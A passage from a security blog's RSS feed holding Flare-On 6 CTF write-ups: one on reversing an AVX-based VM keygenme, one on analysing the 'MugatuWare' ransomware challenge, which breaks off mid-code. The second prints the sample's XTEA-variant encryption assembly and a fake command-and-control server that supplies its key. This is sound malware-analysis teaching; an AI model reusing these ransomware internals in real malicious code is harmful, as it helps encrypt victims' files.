<code>f0ll0w_th3_br34dcrumbs@flare-on.com</code></p><h2 id="final-words">Final Words</h2><p>With this we come to end of the Flare-on 2019 CTF write-up series. Barring the final two, the challenges this year were slightly easier that the last year. Hope you liked the write-ups. If you have any queries or suggestions, feel free to leave a comment below.</p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Flare-On 6 CTF WriteUp (Part 11)]]></title>
      <description><![CDATA[Flare-On 6 CTF WriteUp : vv_max]]></description>
      <link>https://blog.attify.com/flare-on-6-ctf-writeup-part11/</link>
      <guid isPermaLink="false">5d8b46f238c2d600381c9ffb</guid>
      <category><![CDATA[CTF]]></category>
      <category><![CDATA[Flare-on]]></category>
      <category><![CDATA[Reversing]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Sat, 19 Oct 2019 18:42:00 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2019/10/11.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2019/10/11.png" alt="Flare-On 6 CTF WriteUp (Part 11)"><p>This is the eleventh part of the Flare-On 6 CTF WriteUp Series.</p><h2 id="11-vv_max">11 - vv_max</h2><p>The challenge reads</p><blockquote>Hey, at least its not subleq.</blockquote><p>Subleq is an esoteric language. The program grammar consists of a single instruction &quot;Subtract and Branch if Less Than or Equal&quot;. The final challenge of Flare-on 5 deal with reversing such a binary. You can read more on it <a href="https://blog.attify.com/flare-on-5-writeup-part9/">here</a>.</p><p>Different from previous year&apos;s, this year&apos;s penultimate challenge is not about Subleq but rather about a reversing a small VM which uses <a href="https://en.wikipedia.org/wiki/Advanced_Vector_Extensions">AVX</a> instructions for its operation. </p><p>For running the challenge binary our processor must support AVX. Nearly all Intel/AMD CPU released within the last 7-8 years supports AVX. In case our CPU doesn&apos;t support AVX we may still be able to run it using <a href="https://software.intel.com/en-us/articles/intel-software-development-emulator">Intel Software Development Emulator</a> (SDE). Intel SDE uses <a href="https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool">Pin</a> - a DBI tool to &quot;run&quot; the binary. Any instruction which is not supported by the host CPU will be emulated by SDE.</p><p>Let&apos;s go back to the challenge. From the <code>main</code> function there&apos;s a call to a function which I have named <code>is_avx_supported</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-3.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 1: Call to is_avx_supported</figcaption></figure><p>This function tests the presense of AVX support on the host CPU as shown in Figure 2.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-5.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 2: Checking AVX support</figcaption></figure><p>If we run the binary it just prints out &quot;Nope!&quot; and then quits. We need to provide two command line arguments.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-8.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 3: Checking length of the arguments</figcaption></figure><p>As we can see in Figure 3, the length of the first argument must lie between 4 and 32. The second argument must be 32 chars in length. If both of these checks succeed it goes on to execute the main code.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-11.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 4: The main code</figcaption></figure><p>The second parameter to the <code>check</code> function is the first command line argument. Going into <code>check</code> we can see that after it prints &quot;That is correct&quot; it compares arg1 with &quot;FLARE2019&quot; as in Figure 5.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-10.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 5: Arg1 must equal FLARE2019</figcaption></figure><p>If arg1 equals &quot;FLARE2019&quot; it goes on to print Flag: &quot;. From this we infer the first command line argument must be &quot;FLARE2019&quot;. The challenge is like a typical <em>keygenme</em> where it checks name-serial pairs. We need to calculate the serial for a then name &quot;FLARE2019&quot;.</p><p>We can already see a few AVX instructions in the <code>check</code> function. The logic of the challenge is implemented by such instructions. Going through the list of functions in IDA, we can find several functions with AVX instructions in them. These functions are actually handlers implementing a particular opcode of the VM.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-12.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 6: setup_handlers&#xA0;</figcaption></figure><p> In the <code>setup_handlers</code> function, it fills an array with the addresses of the handler functions. In total there are 24 handler functions for 24 VM instructions. The bytecode of the VM is of size 0x5FB as evident from the <code>qmemcpy</code> call.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-13.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>FIgure 7: The VM bytecode</figcaption></figure><p>The VM instructions themselves are of varying length. For example, the VM instruction which has the opcode 0 is just 1 byte in size whereas the one with opcode 1 is 4 bytes in size. We can obtain the lengths of the instructions by analyzing the decompiled code of the handlers.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-14.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 7: Handler for opcode 0</figcaption></figure><p><code>a1[384]</code> stores the Program Counter (PC) of the VM. In <code>opcode_00</code> we can see its incremented by 1 which corresponds to the length of the instruction. Similarly, in <code>opcode_01</code> , PC is incremented by 4 as shown in Figure 8.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-15.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 8: Handler for opcode 01</figcaption></figure><p>Out of the 24 instructions implemented by the VM, opcode_00 has a length of 1 byte and opcode_11 has a size of 34 bytes. Remaining 22 opcodes have a length of 4 bytes. Also the VM has no control flow instructions i.e. there is no instruction for direct/indirect calls/jumps. Knowing the length of the instructions we can code a small tool to print the disassemble the bytecode.</p><pre><code>bytecode = [] # The entire bytecode goes here

arg1 = bytearray(&apos;FLARE2019&apos;)
arg2 = bytearray(&apos;A&apos;*32)

bytecode[3:3+len(arg1)] = arg1
bytecode[37:37+len(arg2)] = arg2

ip = 0

ins_len_map = {
  0x00: 1,
  0x01: 4,
  0x02: 4,
  0x03: 4,
  0x04: 4,
  0x05: 4,
  0x07: 4,
  0x0B: 4,  
  0x11: 2+32,
  0x12: 4,
  0x13: 4,
  0x14: 4,
  0x15: 4,
  0x16: 4,
  }

while ip &lt; len(bytecode):
  ins = bytecode[ip]

  if ins in ins_len_map:
    i_len = ins_len_map[ins]
    print &apos;opcode_{:02X}&apos;.format(ins)
    ip += i_len

  elif ins == 0xff:
    break
  else:
    print &apos;[!] Unknown opcode&apos;
    break</code></pre><p>Running the script we will obtain sequential list of instructions executed by the VM. The output of the script can be found <a href="https://gist.github.com/extremecoders-re/0a474dd7338a1ed2fea31c2899396695">here</a>. A close look at the script reveals that the following 10 opcodes are missing</p><ul><li>opcode_06</li><li>opcode_08</li><li>opcode_09</li><li>opcode_0A</li><li>opcode_0C</li><li>opcode_0D</li><li>opcode_0E</li><li>opcode_0F</li><li>opcode_10</li><li>opcode_17</li></ul><p>Thus out of the 24 supported VM instructions only 14 are executed. Rest of the 10 instructions are redundant and need not be analyzed.</p><h3 id="using-compiler-intrinsics">Using compiler intrinsics</h3><p>To understand what an opcode does we need to convert it to a C like representation. The Microsoft C++ compiler supports intrinsics which can be used to represent an AVX instruction. We can use the <a href="https://software.intel.com/sites/landingpage/IntrinsicsGuide/#techs=AVX,AVX2">Intel Intrinsics Guide</a> as a reference to find the corresponding intrinsic for an AVX instruction.</p><p>Out of the 14 instructions, opcode_00 is only executed once and its purpose is just to zero out the memory location <code>[rcx+rax+800h]</code> (Figure 7). The other opcodes represented using compiler intrinsics are as follows.</p><pre><code>// Vertical multiply
void opcode_01(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_maddubs_epi16(scratch[a], scratch[b]));
}

// Multiply packed signed
void opcode_02(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_madd_epi16(scratch[a], scratch[b]));
}

// Xor
void opcode_03(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_xor_si256 (scratch[a], scratch[b]));
}

// Or
void opcode_04(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_or_si256(scratch[a], scratch[b]));
}

// And
void opcode_05(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_and_si256 (scratch[a], scratch[b]));
}

// Add
void opcode_07(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_add_epi8(scratch[a], scratch[b]));
}

// Add
void opcode_0B(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_add_epi32(scratch[a], scratch[b]));
}

// Copy
void opcode_11(int dest, BYTE *v)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_loadu_si256((__m256i*)v));
}

//Shift right
void opcode_12(int dest, int a, int imm8)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_srli_epi32 (scratch[a], imm8));
}

// Shift left
void opcode_13(int dest, int a, int count)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_slli_epi32(scratch[a], count));
}

// Shuffle
void opcode_14(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_shuffle_epi8(scratch[a], scratch[b]));
}

//permute
void opcode_15(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_permutevar8x32_epi32(scratch[a], scratch[b]));
}

// Compare
void opcode_16(int dest, int a, int b)
{
  _mm256_storeu_si256(&amp;scratch[dest], _mm256_cmpeq_epi8(scratch[a], scratch[b]));
}</code></pre><h3 id="inferring-the-vm-algorithm">Inferring the VM algorithm</h3><p>Among the 13 opcodes, there is just a single opcode which compares two values - opcode_16 Let&apos;s set a breakpoint on the <code>vcmpeqb</code> instruction in <code>opcode_16</code> and debug the program with a proper arguments like <code>vvmax.exe FLARE2019 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/11-9.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 9: Our input is compared with the forward slash character</figcaption></figure><p>Our input (32 A&apos;s) is compared with 32 forward slash characters. Lets keep a note of this.</p><p>Now back in the <code>check</code> function there is another <code>vcmpeqb</code> instruction that compares two values as shown in Figure 10.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-16.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 10: Another vcmpeqb instruction</figcaption></figure><p>Let&apos;s use the debugger to find what values are being compared.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-18.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 11: First attempt</figcaption></figure><p>It compares the 256 bit value <code>70 70 B2 AC 01 D2 5E 61 0A A7 2A A8 08 1C 86 1A E8 45 C8 29 B2 F3 A1 1E 00 00 00 00 00 00 00 00</code> with zero.</p><p>Let&apos;s try running with a slightly different input say <code>vvmax.exe FLARE2019 BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-19.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 12: Second attempt</figcaption></figure><p>In our second attempt, the 256 bit value in memory doesn&apos;t change. However the value in <code>ymm0</code> has changed to 4. By more attempts, we can infer the 256 bit value in memory is calculated from the first command line argument (FLARE2019) which is fixed. The value in <code>ymm0</code> register is calculated from the second argument.</p><p>For a change, let&apos;s run using the following argument <code>vmax.exe FLARE2019 CCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-20.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 13: Third attempt</figcaption></figure><p>We have modified the first 4 characters of our input. Corresponding to that only 3 bytes in <code>ymm0</code> has changed. Let&apos;s recap what we have found so far</p><ul><li>There is a comparison against the <code>/</code> character</li><li>4 bytes of input correspond to 3 bytes after some calculation</li><li>A buffer of 32&apos;A after calculation becomes 32 zeroes</li></ul><p>This strongly suggests the calculation implemented in the VM on the second argument is nothing but Base64.</p><h3 id="getting-the-flag">Getting the flag</h3><p>Let&apos;s try base64 encoding the 256 bit value <code>70 70 B2 AC 01 D2 5E 61 0A A7 2A A8 08 1C 86 1A E8 45 C8 29 B2 F3 A1 1E 00 00 00 00 00 00 00 00</code> neglecting the trailing zeroes.</p><pre><code>&gt;&gt;&gt; v = &apos;70 70 B2 AC 01 D2 5E 61 0A A7 2A A8 08 1C 86 1A E8 45 C8 29 B2 F3 A1 1E&apos;
&gt;&gt;&gt; v = v.replace(&apos; &apos;, &apos;&apos;)
&gt;&gt;&gt; v = v.decode(&apos;hex&apos;).encode(&apos;base64&apos;)
&gt;&gt;&gt; v
&apos;cHCyrAHSXmEKpyqoCByGGuhFyCmy86Ee\n&apos;</code></pre><p>Running the program using the base64 encoded value as the second argument, we get the flag.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-21.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 11)" loading="lazy"><figcaption>Figure 14: The flag!</figcaption></figure><p>Flag: <a><code>AVX2_VM_M4K3S_BASE64_C0MPL1C4T3D@flare-on.com</code></a></p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Flare-On 6 CTF WriteUp (Part 10)]]></title>
      <description><![CDATA[Flare-On 6 CTF WriteUp : Mugatu]]></description>
      <link>https://blog.attify.com/flare-on-6-ctf-writeup-part10/</link>
      <guid isPermaLink="false">5d8b463938c2d600381c9fce</guid>
      <category><![CDATA[CTF]]></category>
      <category><![CDATA[Flare-on]]></category>
      <category><![CDATA[Reversing]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Fri, 18 Oct 2019 17:42:00 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2019/10/10.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2019/10/10.png" alt="Flare-On 6 CTF WriteUp (Part 10)"><p>This is the tenth part of the Flare-On 6 CTF WriteUp Series.</p><h2 id="10-mugatu">10 - Mugatu</h2><p>The challenge reads</p><blockquote>Hello,<br>I&#x2019;m working an incident response case for Derek Zoolander. He clicked a link and was infected with MugatuWare! As a result, his new headshot compilation GIF was encrypted. To secure an upcoming runway show, Derek needs this GIF decrypted; however, he refuses to pay the ransom. We received an additional encrypted GIF from an anonymous informant. The informant told us the GIF should help in our decryption efforts, but we were unable to figure it out. We&#x2019;re reaching out to you, our best malware analyst, in hopes that you can reverse engineer this malware and decrypt Derek&#x2019;s GIF.<br><br>I&apos;ve included a directory full of files containing:<br>MugatuWare malware<br>Ransom note (GIFtToDerek.txt)<br>Encrypted headshot GIF (best.gif.Mugatu)<br>Encrypted informant GIF (the_key_to_success_0000.gif.Mugatu)<br><br>Thanks, Roy</blockquote><p>The challenge is a reference to the movie <a href="https://en.wikipedia.org/wiki/Zoolander_2">Zoolander 2</a>. The main objective is to decrypt a GIF file which has been encrypted by the ransomware. In addition to these two files we have an additional encrypted GIF which has been provided for our help. Since we are dealing with a ransomware it&apos;s best to use a Virtual Machine. Doing so will also enable us to run the sample and observe its behavior.</p><h3 id="dynamic-analysis">Dynamic Analysis</h3><p>For dynamic analysis I&apos;ll be using <a href="http://www.rohitab.com/apimonitor">API Monitor</a>. This free tool allows us to trace all the API calls made by an program while its running. Using the tool we notice the following:</p><ul><li>URL <a href="http://twitrss.me/twitter_user_to_rss/?user=ACenterForAnts"><code>http://twitrss.me/twitter_user_to_rss/?user=ACenterForAnts</code></a>. This was called through <code>InternetOpenURLA</code>.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-156.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 1: Twitrss.me</figcaption></figure><ul><li>A POST request to <code>mugatu.flare-on.com</code>. Interestingly, querying with <code>nslookup</code> from the terminal returns <code>NXDOMAIN</code> which implies it&apos;s a non existent domain.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-157.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 2: POST request to mugatu.flare-on.com</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-158.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 3: NXDOMAIN</figcaption></figure><p>Let&apos;s add the following entry to our host file (<code>C:\Windows\System32\drivers\etc\host</code>) for redirecting traffic to <code>mugatu.flare-on.com</code> to localhost.</p><pre><code>127.0.0.1 mugatu.flare-on.com</code></pre><p>We need to set up a HTTP server for receiving the POST request. We can code one in Python (like below) or use a tool like <a href="https://packetsender.com/">Packet Sender</a>. Once the server is setup let&apos;s run the binary.</p><pre><code class="language-Python">from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers[&apos;Content-Length&apos;])
        body = self.rfile.read(content_length)
        print body
        self.send_response(200)
        self.end_headers()

httpd = HTTPServer((&apos;localhost&apos;, 80), SimpleHTTPRequestHandler)
httpd.serve_forever()</code></pre><p>The malware sends out POST requests which looks like Base64 encoded data.</p><pre><code>&#x3BB; python post_server.py
7u6sH0UAAAAIQk4RXEsKXQ5UQVxLHX8dVUIfDX4WV14IYQVNGRwGAAATFRFPBhQmGi8+EwtEABFTHRBRQF1VVlZVRhcDHllUVhRbEVg=
127.0.0.1 - - [30/Sep/2019 13:54:11] &quot;POST / HTTP/1.1&quot; 200 -
7u6sH0UAAABBZG1pbnwxMC4wLjIuMTV8Ni0xLTc2MDF8QWRtaW5pc3RyYXRvcnxDOlxXaW5kb3dzfDA5LzMwLzIwMTktMDg6MjQ6MTA=
127.0.0.1 - - [30/Sep/2019 13:54:17] &quot;POST / HTTP/1.1&quot; 200 -
7u6sH0UAAAAIQk4RXEsKXQ5UQVxLHX8dVUIfDX4WV14IYQVNGRwGAAATFRFPBhQmGi8+EwtEABFTHRBRQF1VVlZVRhcDHllUVhRbEVg=
127.0.0.1 - - [30/Sep/2019 13:54:22] &quot;POST / HTTP/1.1&quot; 200 -</code></pre><p>If we look at the POST request in a debugger we can find expects a response to the POST request which apparently should also be Base64 encoded as shown in Figure 4.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/10-4.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 4: The response should be base64 encoded</figcaption></figure><p>After Base64 decoding the response, it&apos;s xored with 0x4D and it must match the string <code>orange mocha frappuccino\0</code>. Appended with this string we need to send another 4 byte value which will later be used as a key to encrypt files as we will soon see. In the code below, we are sending the key <code>\x01\x02\x03\x04</code>.</p><pre><code>from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import base64

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers[&apos;Content-Length&apos;])
        body = self.rfile.read(content_length)
        print body
        self.send_response(200)
        self.end_headers()
        start = str(bytearray(map(lambda x: x^0x4d, bytearray(&apos;orange mocha frappuccino\0&apos;))))
        key = &apos;\x01\x02\x03\x04&apos;
        to_send = start + key + &apos;\xff&apos;*34
        self.wfile.write(base64.b64encode(to_send))
        
httpd = HTTPServer((&apos;localhost&apos;, 80), SimpleHTTPRequestHandler)
httpd.serve_forever()</code></pre><p> Let&apos;s go back to API Monitor. We spot a series of the following function calls</p><ul><li><code>GetLogicalStringsA</code></li><li><code>GetDriveTypeA</code></li><li><code>FindFirstFileA</code></li></ul><p>Typically, in a ransomware these functions are generally used to enumerate all the files in a directory.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-159.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 5: Call to FindFirstFileA</figcaption></figure><p>Let&apos;s set a breakpoint on the functions and try to know what it&apos;s really doing. To thwart analysis, all the API calls have been obfuscated. Shown in Figure 6 are the stubs which ultimately lead to the real API.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-160.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 6: Obfuscated API calls stub</figcaption></figure><p>For example in Figure 7, it is actually a call to <code>FindFirstFileA</code>. Instead of a direct call, it calls the corresponding stub which ultimately lands on the real function.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-161.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 7: Obfuscated call to FindFirstFileA</figcaption></figure><h3 id="deobfuscating-api-calls">Deobfuscating API calls</h3><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-162.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 8: Addresses of the stubs</figcaption></figure><p>The addresses of the stubs are stored in a pointer table as shown in Figure 8. To deobfuscate, we can simply write the address of the final function in the pointer table bypassing the stub. The following x64dbg script does that</p><pre><code>addr = dump.sel()
i = 0

loop_1:
mov api_jump, [addr]
api = dis.imm(api_jump)
not api
mov [addr], api
add addr, 4

inc i
cmp i, 0x50
jl loop_1</code></pre><p>After running the script, the pointer table look like Figure 9.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-163.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 9: Updated pointer table</figcaption></figure><p>Correspondingly, the disassembly is now readable as we have removed all the indirect calls.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-164.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 10: Call indirection removed</figcaption></figure><p>The malware recursively iterates over all directories starting from <code>C:\</code> drive. As we can see in Figure 11, it compares the directory name with the string &quot;really, really, really, ridiculously good looking gifs&quot;.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-165.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 11: The malware it searching for a special directory</figcaption></figure><p>Which means its searching for a directory with that specific name. Lets create one such directory like <code>C:\$\really, really, really, ridiculously good looking gifs</code>. We have created the directory under a directory named <code>$</code> so that it will be found first. Within the directory we keep a GIF file since we know it encrypts them. Instead of a real GIF we can use a dummy file filled with the a bunch of A&apos;s such that it will be easier to spot in the debugger If at this point we let the malware run freely, we&apos;ll see that it goes on to encrypt the dummy GIF with <code>.Mugatu</code> extension appended. </p><h3 id="finding-the-encryption-algorithm">Finding the encryption algorithm</h3><p>We need to locate the encryption code by which it encrypts the files. A quick way is to set breakpoint on File Handling APIs like <code>CreateFileA</code>, <code>ReadFile</code>, <code>WriteFile</code> etc. Using this approach we can quickly zero in on the relevant code as shown in Figure 12.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-166.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 12: Code related to encryption</figcaption></figure><p>The malware loads the file in memory using <code>CreatFileA</code>, <code>CreateFileMappingA</code> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile"><code>MapViewOfFile</code></a>. A few lines below we notice an indirect call to a function which does the encryption.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-168.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 13: Call to encrypt function</figcaption></figure><p>This function takes in three parameters:</p><ul><li>A pointer to the buffer containing the file contents to encrypt</li><li>Length of the above buffer</li><li>Pointer to the 4 byte key (which in our case was <code>\x01\x02\x03\x04</code>)</li></ul><pre><code>push ebp
mov ebp,esp
push ebx
push esi
mov esi,dword ptr ss:[ebp+C]
push edi
--------------snip--------------

add edx,esi
xor ecx,eax
sub esi,61C88647
add ecx,ebx

--------------snip--------------
pop esi
pop ebx
pop ebp
ret</code></pre><p>Inspecting the code we notice the constant <code>61C88647</code>. Searching for this value on Google points us to <a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm">Tiny Encryption Algorithm (TEA)</a>. Note that the actual constant used in TEA source code is <code>9E3779B9</code> (which is the same as <code>-61C88647</code>when treated as an unsigned 32-bit integer). Apart from TEA, the <a href="https://en.wikipedia.org/wiki/XTEA">XTEA</a> cipher also uses the same constant and have a similar structure. </p><p>Let&apos;s try to decompile the encryption code. We can do this by copying the assembly to a new file and assemble it using <a href="https://flatassembler.net/">fasm</a>.</p><pre><code>; enc-algo.asm

format PE

encrypt:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    mov esi, dword [ebp+0xC]
    push edi
    mov edi, dword [esi]
    mov ebx, dword [esi+0x4]
    xor esi, esi

  here:
    mov ecx, dword [ebp+0x10]
    mov eax, esi
    and eax, 0x3
    movzx edx, byte [eax+ecx*1]
    mov ecx, ebx
    shl ecx, 0x4
    mov eax, ebx
    shr eax, 0x5
    add edx, esi
    xor ecx, eax
    sub esi, 0x61C88647
    add ecx, ebx
    xor ecx, edx
    mov edx, dword [ebp+0x10]
    add edi, ecx
    mov ecx, edi
    mov eax, edi
    shr eax, 0x5
    shl ecx, 0x4
    xor ecx, eax
    mov eax, esi
    shr eax, 0xB
    add ecx, edi
    and eax, 0x3
    movzx eax, byte [eax+edx]
    add eax, esi
    xor ecx, eax
    add ebx, ecx
    dec dword [ebp+0x8]
    jne short here
    mov esi, dword [ebp+0xC]
    mov dword [esi], edi
    pop edi
    mov dword [esi+0x4], ebx
    pop esi
    pop ebx
    pop ebp
    ret</code></pre><p>After renaming the variables appropriately, our decompiled code looks like Figure 14.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-1.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 14: Decompiled encryption function</figcaption></figure><p>The TEA cipher uses a fixed number (32) of rounds which is not the case with here. This encryption algorithm here is actually a modified version of the XTEA cipher using a 32 bit key instead of the standard 64 bit.</p><h3 id="decrypting-the-informant-gif">Decrypting the informant GIF</h3><p>The informant GIF has the filename <em>the_key_to_success_0000.gif.Mugatu</em>. The name hints that the key used to encrypt this file is <code>\x00\x00\x00\x00</code>. Using the following code we can decrypt the informant GIF.</p><pre><code>#include &lt;stdio.h&gt;

typedef unsigned int uint32_t;
typedef unsigned char uint8_t;

void xtea_decipher(unsigned int num_rounds, uint32_t v[2], uint8_t const key[4]) {
    unsigned int i;
    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;
    for (i=0; i &lt; num_rounds; i++) {
        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);
        sum -= delta;
        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);
    }
    v[0]=v0; v[1]=v1;
}

void main()
{
  FILE *inf = fopen(&quot;the_key_to_success_0000.gif.Mugatu&quot;, &quot;rb&quot;);
  FILE *out = fopen(&quot;the_key_to_success_0000.gif&quot;, &quot;wb&quot;);
  uint8_t key[] = {0, 0, 0, 0};
  
  fseek(inf, 0, SEEK_END);
  int file_size = ftell(inf);
  rewind(inf);
  int remaining = file_size;
  uint32_t ct[2];  

  while (remaining &gt; 8)
  {
    fread(ct, sizeof(uint32_t), 2, inf);
    xtea_decipher(32, ct, key);
    fwrite(ct, sizeof(uint32_t), 2, out);
    remaining -= 8;
  }

  uint8_t buffer[8];

  if (remaining &gt; 0)
  {
    fread(buffer, remaining, 1, inf);
    fwrite(buffer, remaining, 1, out);
  }
  fclose(inf);
  fclose(out);
